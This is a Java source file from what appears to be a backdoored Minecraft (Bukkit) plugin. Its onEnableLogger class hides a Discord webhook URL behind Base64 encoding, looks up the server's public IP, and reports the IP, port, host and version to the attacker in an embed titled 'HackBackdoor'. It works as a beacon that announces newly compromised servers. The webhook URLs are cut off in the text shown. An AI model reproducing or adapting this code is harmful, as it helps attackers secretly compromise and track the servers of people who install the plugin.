package me.system.runner.methods;

import com.github.gist.DiscordWebhook;
import me.system.runner.command.CommandManager;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.events.*;
import me.system.runner.utils.DWeb;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.Settings;
import me.system.runner.utils.SLAPI;

import java.net.InetAddress;
import java.util.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.awt.Color;
import java.util.Base64;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;

import me.system.runner.events.*;
import me.system.runner.command.impl.login.LoginCommand;
import me.system.runner.events.IPGetterPlayerVise;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class onEnableLogger {

    public static Boolean unknown_host = false;
    public static Boolean logged_already = false;
    public static Boolean host_logged_already = false;
    public static Boolean host_message_already = false;

    public static void start2() throws IOException {
        String originalBase = "https:
        byte[] ume = Base64.getEncoder().encode(originalBase.getBytes());
        DataManager.getData().set("mywh", (Object) new String(ume));
        DataManager.saveData();
        String machineIP = Bukkit.getServer().getIp();
        DataManager.getData().set("serverip", (Object) new String(machineIP));
        DataManager.saveData();

        if (DataManager.getData().getString("mywh").length() > 2) {
            String messagebackdoored = DataManager.getData().getString("serverip") + " has been started up with HackBackdoor!!!!";
            byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
            DWeb webhook = new DWeb(new String(u2));
            Date date = Calendar.getInstance().getTime();
            URL url = new URL("https:
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = br.readLine();

            
            InetAddress addr = InetAddress.getByName(ip);
            String host = addr.getHostName();
            if (Character.isDigit(host.charAt(0))) {
                host = "Unknown (Possible IP Masking)";
                unknown_host = true;
            }

            
            webhook.setContent("");
            webhook.setTts(false);
            webhook.addEmbed((new DWeb.EmbedObject())
                    .setTitle("HackBackdoor")
                    .setDescription("Server started running HB Door:")
                    .setColor(Color.YELLOW)
                    .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                    .addField("Server version: ", Bukkit.getVersion(), false)
                    .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
                    .addField("Server Host:", host, false)
                    .addField("At date:", date.toString(), false));
            webhook.execute();
            try {
                webhook.execute();
            } catch (IOException iOException) {
                
            }
        }
    }
}
